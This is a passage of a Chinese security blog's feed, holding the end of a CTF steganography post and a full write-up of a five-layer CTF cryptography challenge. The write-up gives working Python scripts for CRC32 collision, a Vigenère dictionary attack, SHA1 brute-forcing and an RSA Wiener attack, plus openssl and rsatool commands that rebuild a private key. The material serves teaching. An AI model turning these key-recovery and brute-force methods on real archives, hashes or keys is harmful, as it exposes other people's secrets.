alt="CTF中图片隐藏文件分离方法总结"></p><p>当我们用winhex打开文件，发现wh3r3_is_f14g.jpg文件最后数据块不是FF D9 jpg文件的结束标志，而是zip文件的结束标志。</p><p><img src="http://img2.tuicool.com/IBbuY3N.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>我们直接将文件改名为wh3r3_is_f14g.zip，打开得到flag.txt。</p><p><img src="http://img2.tuicool.com/Vj2aQrE.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>最后打开flag.txt得到flag。</p><p><img src="http://img0.tuicool.com/ZjIJrqZ.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><h2 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h2><p>图片隐写方式有很多种，在此只介绍了这一种，如果以后有机会会写其他的图片隐写，如果对隐写感兴趣这里推荐一本机械工业出版社的《数据隐藏技术揭秘：破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》，如果你不想购买实体书，可以<a href="http://www.jb51.net/books/434273.html" target="_blank" rel="external">下载pdf版</a>。</p><p>这里我把所有图片打包了zip，如果有需要自行下载吧: P</p><p><a href="https://www.hackfun.org/usr/uploads/2016/07/3701056190.zip" target="_blank" rel="external">Steganography_Pictures.zip</a></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 隐写术 </tag>
            
            <tag> ctf隐写 </tag>
            
            <tag> ctf中图片隐藏文件分离 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一道可以学到密码知识的CTF密码学题目]]></title>
      <url>/2017/01/04/%E4%B8%80%E9%81%93%E5%8F%AF%E4%BB%A5%E5%AD%A6%E5%88%B0%E5%AF%86%E7%A0%81%E7%9F%A5%E8%AF%86%E7%9A%84CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这题是以前出的一道CTF密码学题目，至于设置5层密码只是想让初学者学到更多的东西，感兴趣的小伙伴可以<a href="https://github.com/sunnyelf/Self-initiated-CTF-challenges/tree/master/Sunyelf-Cryptography-400-20161008" target="_blank" rel="external">下载题目</a>玩玩。</p><h1 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h1><a id="more"></a><h2 id="1、第一层：CRC32碰撞"><a href="#1、第一层：CRC32碰撞" class="headerlink" title="1、第一层：CRC32碰撞"></a>1、第一层：CRC32碰撞</h2><p>得到题目压缩包:</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/1589614413.png" alt="1.png"></p><p>尝试解压，却发现需要密码，根据压缩包里的文件和文件名，猜测是题意是想让我们通过对pwd1，pwd2和pwd3文本文件进行CRC32碰撞获得文本内容，从而得到组合密码。</p><p>通过网上查找资料，了解CRC32碰撞原理，了解原理之后可以在github上找到可利用的Python<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="external">脚本</a>。</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/1456618177.png" alt="2.png"></p><p>分别对3个CRC32值进行碰撞，找到最可能的组合：_CRC32_i5_n0t_s4f3，输入密码解压进入下一层。<br>如果是善于动手编程能力较好的小伙伴也可以自己编写一个脚本来跑，下面给出自己的demo：</p><pre><code># -*- coding: utf-8 -*-
# crc32Collision.py
import threading
import binascii
import time

def breakpassword():
    start=time.clock()
    crc_num=set([0x7C2DF918,0xA58A1926,0x4DAD5967])
    x = range(32,128)
    for i in x:
        for j in x:
            for k in x:
                for l in x:
                    for m in x:
                        for n in x:
                            mutex.acquire() # 取得锁
                            string=chr(i)+chr(j)+chr(k)+chr(l)+chr(m)+chr(n)
                            if binascii.crc32(string) in crc_num:
                                print &quot;crc32 of %s is-&gt; %s&quot; %(string,hex(binascii.crc32(string)))
                                f=open(&quot;string.txt&quot;,&apos;a&apos;)
                                f.write(string)
                                f.close()
                            mutex.release() # 释放锁
    end=time.clock()
    print &quot;Used time: %f s&quot; % (end - start)

def main(thread_num):
    print &quot;breaking,please wait!&quot;
    global mutex #定义全局变量
    mutex=threading.Lock() # 创建锁

    threads=[] #定义线程池
    # 先创建线程对象
    for x in xrange(0,thread_num): 
        threads.append(threading.Thread(target=breakpassword))
        # 启动所有线程
        for t in threads:
            t.start()
        # 主线程中等待所有子线程退出
        for t in threads:
            t.join()

if __name__ == &apos;__main__&apos;:
    main(10)  # 创建n个线程
</code></pre><h2 id="2、第二层：维吉尼亚基于字典攻击"><a href="#2、第二层：维吉尼亚基于字典攻击" class="headerlink" title="2、第二层：维吉尼亚基于字典攻击"></a>2、第二层：维吉尼亚基于字典攻击</h2><p>解压之后得到下图三个文件：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/2145776761.png" alt="3.png"></p><p>打开tips.txt读懂题意，要求我们在keys.txt中找到密钥解密ciphertext.txt，解密密文之后便可以得到Find password.7z的解压密码。通过网上大量的资料查阅，了解维吉尼亚密码加密解密原理和算法，搜索相应的解密工具可以在<a href="http://inventwithpython.com/hacking/diff/" target="_blank" rel="external">http://inventwithpython.com/hacking/diff/</a>找到可以模板，需要读懂相应模块并修改使用：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#vigenereDictionaryHacker.py</span></div><div class="line"><span class="keyword">import</span> detectEnglish</div><div class="line"></div><div class="line">LETTERS = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">translateMessage</span><span class="params">(key, message, mode)</span>:</span></div><div class="line">	translated = [] <span class="comment"># 存储加密/解密消息字符串</span></div><div class="line">	keyIndex = <span class="number">0</span></div><div class="line">	key = key.upper()</div><div class="line">	<span class="keyword">for</span> symbol <span class="keyword">in</span> message: <span class="comment"># 遍历每个消息里的字符的消息</span></div><div class="line">		num = LETTERS.find(symbol.upper())</div><div class="line">		<span class="keyword">if</span> num != <span class="number">-1</span>: <span class="comment"># -1 意味着转换为大写在LETTERS找不到</span></div><div class="line">			<span class="keyword">if</span> mode == <span class="string">'encrypt'</span>:</div><div class="line">				num += LETTERS.find(key[keyIndex]) <span class="comment"># 加密时相加</span></div><div class="line">			<span class="keyword">elif</span> mode == <span class="string">'decrypt'</span>:</div><div class="line">				num -= LETTERS.find(key[keyIndex]) <span class="comment"># 解密时相减</span></div><div class="line">			num %= len(LETTERS) <span class="comment"># 处理潜在的循环			</span></div><div class="line">			<span class="comment"># 添加转换后加密/解密字符</span></div><div class="line">			<span class="keyword">if</span> symbol.isupper():</div><div class="line">				translated.append(LETTERS[num])</div><div class="line">			<span class="keyword">elif</span> symbol.islower():</div><div class="line">				translated.append(LETTERS[num].lower())</div><div class="line">			keyIndex += <span class="number">1</span> <span class="comment"># 继续下一个用密钥字符来解密</span></div><div class="line">			<span class="keyword">if</span> keyIndex == len(key):</div><div class="line">				keyIndex = <span class="number">0</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># 字符不在LETTERS里直接添加</span></div><div class="line">			translated.append(symbol)</div><div class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(translated)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptMessage</span><span class="params">(key, message)</span>:</span></div><div class="line">	<span class="keyword">return</span> translateMessage(key, message, <span class="string">'decrypt'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hackVigenere</span><span class="params">(ciphertext)</span>:</span></div><div class="line">	fo = open(<span class="string">'keys.txt'</span>)</div><div class="line">	words = fo.readlines()</div><div class="line">	fo.close()</div><div class="line">	<span class="keyword">for</span> word <span class="keyword">in</span> words:</div><div class="line">		word = word.strip()</div><div class="line">		decryptedText = decryptMessage(word, ciphertext)</div><div class="line">		<span class="keyword">if</span> detectEnglish.isEnglish(decryptedText, wordPercentage=<span class="number">40</span>):</div><div class="line">			print(<span class="string">'------------------------&gt;&gt;&gt;Notice!&lt;&lt;&lt;----------------------'</span>)</div><div class="line">			print(<span class="string">'Possible encryption break:'</span>)</div><div class="line">			print(<span class="string">'-&gt;&gt;Possible key: '</span> + str(word))</div><div class="line">			print(<span class="string">'-&gt;&gt;Possible plaintext: '</span> + decryptedText[:<span class="number">100</span>])</div><div class="line">			print(<span class="string">'Enter D for done, or just press Enter to continue breaking:'</span>)</div><div class="line">			response = raw_input(<span class="string">'&gt; '</span>)</div><div class="line">			<span class="keyword">if</span> response.upper().startswith(<span class="string">'D'</span>):</div><div class="line">				<span class="keyword">return</span> decryptedText</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	ciphertext = <span class="string">"""rla xymijgpf ppsoto wq u nncwel ff tfqlgnxwzz sgnlwduzmy vcyg ib bhfbe u tnaxua ff satzmpibf vszqen eyvlatq cnzhk dk hfy mnciuzj ou s yygusfp bl dq e okcvpa hmsz vi wdimyfqqjqubzc hmpmbgxifbgi qs lciyaktb jf clntkspy drywuz wucfm"""</span></div><div class="line">	hackedMessage = hackVigenere(ciphertext)</div><div class="line">	<span class="keyword">if</span> hackedMessage != <span class="keyword">None</span>:</div><div class="line">		print(<span class="string">'\nCopy Possible plaintext to the clipboard:\n'</span>)</div><div class="line">		print(hackedMessage)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		print(<span class="string">'Failed to hack encryption.'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># detectEnglish.py</span></div><div class="line"><span class="comment"># 英文单词探测模块</span></div><div class="line"><span class="comment"># 模块引用:</span></div><div class="line"><span class="comment">#   import detectEnglish</span></div><div class="line"><span class="comment">#   detectEnglish.isEnglish(someString) # 返回真或假</span></div><div class="line"><span class="comment"># 模块需要一个包含常见英文单词的"words.txt"，下载地址：http://invpy.com/dictionary.txt</span></div><div class="line"></div><div class="line">UPPERLETTERS = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line">LETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + <span class="string">' \t\n'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadDictionary</span><span class="params">()</span>:</span></div><div class="line">    dictionaryFile = open(<span class="string">'words.txt'</span>)</div><div class="line">    englishWords = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> dictionaryFile.read().split(<span class="string">'\n'</span>):</div><div class="line">        englishWords[word] = <span class="keyword">None</span></div><div class="line">    dictionaryFile.close()</div><div class="line">    <span class="keyword">return</span> englishWords</div><div class="line"></div><div class="line">ENGLISH_WORDS = loadDictionary()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getEnglishCount</span><span class="params">(message)</span>:</span></div><div class="line">    message = message.upper()</div><div class="line">    message = removeNonLetters(message)</div><div class="line">    possibleWords = message.split()</div><div class="line">    <span class="comment"># print possibleWords</span></div><div class="line">    <span class="keyword">if</span> possibleWords == []:</div><div class="line">        <span class="keyword">return</span> <span class="number">0.0</span> <span class="comment"># 没有单词返回0.0</span></div><div class="line"></div><div class="line">    matches = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> possibleWords:</div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> ENGLISH_WORDS:</div><div class="line">            matches += <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> float(matches) / len(possibleWords)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeNonLetters</span><span class="params">(message)</span>:</span></div><div class="line">    lettersOnly = []</div><div class="line">    <span class="keyword">for</span> symbol <span class="keyword">in</span> message:</div><div class="line">        <span class="keyword">if</span> symbol <span class="keyword">in</span> LETTERS_AND_SPACE:</div><div class="line">            lettersOnly.append(symbol)</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(lettersOnly)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isEnglish</span><span class="params">(message, wordPercentage=<span class="number">20</span>, letterPercentage=<span class="number">85</span>)</span>:</span></div><div class="line">    <span class="comment"># 默认设置转换后的message中单词的20%能在words.txt中的单词列表找到</span></div><div class="line">    <span class="comment"># 默认设置转换后的message中85%是字母或空格</span></div><div class="line">    <span class="comment"># (not punctuation or numbers).</span></div><div class="line">    wordsMatch = getEnglishCount(message) * <span class="number">100</span> &gt;= wordPercentage</div><div class="line">    numLetters = len(removeNonLetters(message))</div><div class="line">    messageLettersPercentage = float(numLetters) / len(message) * <span class="number">100</span></div><div class="line">    lettersMatch = messageLettersPercentage &gt;= letterPercentage</div><div class="line">    <span class="keyword">return</span> wordsMatch <span class="keyword">and</span> lettersMatch</div></pre></td></tr></table></figure><p>解密结果：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/3852877605.png" alt="4.png"></p><p>所以Find password.7z的解压密码就是：vigenere cipher funny</p><h2 id="3、第三层：SHA1"><a href="#3、第三层：SHA1" class="headerlink" title="3、第三层：SHA1"></a>3、第三层：SHA1</h2><p>解压Find password.7z得到如下文件：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/1096498351.png" alt="5.png"></p><p>打开U need unzip password.txt读懂题意，题目要求我们通过编写脚本爆破SHA1的明文密文对，得到明文作为解压密码进入下一关。<br>了解了SHA1密码之后，通过查阅资料发现我们可以使用Python的hashlib模块来进行爆破，下面给出demo：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#break_sha1.py</span></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">match</span><span class="params">(h,pwd)</span>:</span></div><div class="line">	hl=list(h)</div><div class="line">	<span class="keyword">if</span> hl[<span class="number">0</span>]==<span class="string">'6'</span>:</div><div class="line">		<span class="keyword">if</span> hl[<span class="number">1</span>]==<span class="string">'1'</span>:</div><div class="line">			<span class="keyword">if</span> hl[<span class="number">2</span>]==<span class="string">'9'</span>:</div><div class="line">				<span class="keyword">if</span> hl[<span class="number">3</span>]==<span class="string">'c'</span>:</div><div class="line">					<span class="keyword">if</span> hl[<span class="number">4</span>]==<span class="string">'2'</span>:</div><div class="line">						<span class="keyword">if</span> hl[<span class="number">5</span>]==<span class="string">'0'</span>:</div><div class="line">							<span class="keyword">if</span> hl[<span class="number">6</span>]==<span class="string">'c'</span>:</div><div class="line">								<span class="keyword">if</span> hl[<span class="number">8</span>]==<span class="string">'a'</span>:</div><div class="line">									<span class="keyword">if</span> hl[<span class="number">16</span>]==<span class="string">'9'</span>:</div><div class="line">										<span class="keyword">if</span> hl[<span class="number">24</span>]==<span class="string">'b'</span>:</div><div class="line">											<span class="keyword">if</span> hl[<span class="number">32</span>]==<span class="string">'e'</span>:</div><div class="line">												<span class="keyword">print</span> <span class="string">"Find!"</span></div><div class="line">												<span class="keyword">print</span> <span class="string">"Hash:%s"</span> %h</div><div class="line">												<span class="keyword">print</span> <span class="string">"Password:%s"</span> %pwd</div><div class="line">												matched=<span class="number">1</span></div><div class="line">												<span class="keyword">return</span> matched</div><div class="line"></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		matched=<span class="number">0</span></div><div class="line">		<span class="keyword">return</span> matched</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">()</span>:</span></div><div class="line">	x=range(<span class="number">32</span>,<span class="number">128</span>)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> x:</div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> x:</div><div class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> x:</div><div class="line">				<span class="keyword">for</span> l <span class="keyword">in</span> x:</div><div class="line">					pwd=chr(i)+<span class="string">'7'</span>+chr(j)+<span class="string">'5-'</span>+chr(k)+<span class="string">'4'</span>+chr(l)+<span class="string">'3?'</span></div><div class="line">					sha1_hash=hashlib.sha1()</div><div class="line">					sha1_hash.update(pwd)</div><div class="line">					h=sha1_hash.hexdigest()</div><div class="line">					matched=match(h,pwd)</div><div class="line">					<span class="keyword">if</span> matched:</div><div class="line">						<span class="keyword">print</span> <span class="string">"congratulation!"</span></div><div class="line">						<span class="keyword">return</span> <span class="number">0</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	start=time.clock()</div><div class="line">	<span class="keyword">print</span> <span class="string">"Breaking,please wait!"</span></div><div class="line">	generate()</div><div class="line">	end=time.clock()</div><div class="line">	<span class="keyword">print</span> <span class="string">"Used time:%s"</span> %(end-start)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure><p>结果：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/1729918962.png" alt="6.png"></p><p>所以得到Easy SHA1.7z的解压密码：I7~5-s4F3?</p><h2 id="4、第四层：MD5不再安全"><a href="#4、第四层：MD5不再安全" class="headerlink" title="4、第四层：MD5不再安全"></a>4、第四层：MD5不再安全</h2><p>解压Easy SHA1.7z之后得到如下文件：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/2811957084.png" alt="7.png"></p><p>打开MD5_is_really_safe？.txt文本，题目要让我们找到两个不同程序但是他们的MD5值却相同，这题考察我们对MD5安全性的感知度。通过搜索引擎可以找到大量关于王小云教授对MD5破解相关资料，百度关键词：MD5碰撞 MD5校验真的安全吗？ MD5真的已靠不住? 等等。</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/52006505.png" alt="8.png"></p><p>下载HelloWorld-colliding.exe GoodbyeWorld-colliding.exe运行结果：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/570197945.png" alt="9.png"></p><p>Hello World ;-)已在提示里，那么另一个程序的输出就是：Goodbye World :-(<br>根据提示输入做为Vulnerable RSA.7z的解压密码，解压成功进入下一关。</p><h2 id="5、第五层：Vulnerable-RSA"><a href="#5、第五层：Vulnerable-RSA" class="headerlink" title="5、第五层：Vulnerable RSA"></a>5、第五层：Vulnerable RSA</h2><p>解压Vulnerable RSA.7z后得到如下文件：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/4287004043.png" alt="10.png"></p><p>在了解RSA的原理和常见的攻击方法后，我们用<a href="https://github.com/openssl/openssl" target="_blank" rel="external">OpeSSL</a>来导入公钥查看模数n，指数e。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl rsa -inform PEM -in rsa_public_key.pem -noout -modulus -text -pubin</div></pre></td></tr></table></figure><p><img src="https://www.hackfun.org/usr/uploads/2017/03/3636764952.png" alt="11.png"></p><p>可以看到指数（Exponent）很大，在RSA中我们知道ed ≡ 1 (mod φ(n))，如果n确定，e非常大，就会导致d很小，就会出现维纳攻击（<a href="https://en.wikipedia.org/wiki/Wiener%27s_attack" target="_blank" rel="external">Wiener’s attack</a>），攻击原理是使用连分式（<a href="https://en.wikipedia.org/wiki/Continued_fraction" target="_blank" rel="external">Continued fraction</a>）去求得d。</p><p>了解原理后我们可以在github找到基于维纳攻击的工具<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="external">rsa-wiener-attack</a>，然后将其中的RSAwienerHacker.py改写一下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#RSAwienerAttack.py  </span></div><div class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line"><span class="string">    Finds d knowing (e,n)</span></div><div class="line"><span class="string">    applying the Wiener continued fraction attack</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</div><div class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</div><div class="line">        <span class="comment">#check if d is actually the key</span></div><div class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</div><div class="line">            phi = (e*d<span class="number">-1</span>)//k</div><div class="line">            s = n - phi + <span class="number">1</span></div><div class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></div><div class="line">            <span class="comment"># has integer roots</span></div><div class="line">            discr = s*s - <span class="number">4</span>*n</div><div class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</div><div class="line">                t = Arithmetic.is_perfect_square(discr)</div><div class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</div><div class="line">                    print(<span class="string">"\nHacked!"</span>)</div><div class="line">                    <span class="keyword">return</span> d</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    e=<span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></div><div class="line">    n=<span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"e="</span></div><div class="line">    <span class="keyword">print</span> e</div><div class="line">    <span class="keyword">print</span> <span class="string">"n="</span></div><div class="line">    <span class="keyword">print</span> n</div><div class="line">    d=hack_RSA(e,n)</div><div class="line">    <span class="keyword">print</span> <span class="string">"d="</span></div><div class="line">    <span class="keyword">print</span> d</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p>结果：</p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/3705825027.png" alt="12.png"></p><p>我们得到了私钥d，且知道了e，那我们就可以使用rsatool来生产私钥文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rsatool.py -e 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 -n 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 -d 8264667972294275017293339772371783322168822149471976834221082393409363691895 -o rsa_private_key.pem -f PEM</div></pre></td></tr></table></figure><p><img src="https://www.hackfun.org/usr/uploads/2017/03/401759421.png" alt="13.png"></p><p>得到rsa_private_key.pem，于是我们利用OpenSSL对flag.enc解密：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl rsautl -decrypt -in flag.enc -inkey rsa_private_key.pem</div></pre></td></tr></table></figure><p></p><p><img src="https://www.hackfun.org/usr/uploads/2017/03/326547315.png" alt="14.png"></p><p>最终得到flag：flag{W0rld_Of_Crypt0gr@phy}</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 密码学 </tag>
            
            <tag> python </tag>
            
            <tag> cryptographic </tag>
            
            <tag> crc32碰撞 </tag>
            
            <tag> md5不再安全 </tag>
            
            <tag> 维吉尼亚基于字典攻击 </tag>
            
            <tag> rsa wiener attack </tag>
            
            <tag> SHA1爆破 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[人生苦短，你需要用Python来做CTF]]></title>
      <url>/2017/01/02/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E7%94%A8Python%E6%9D%A5%E5%81%9ACTF/</url>
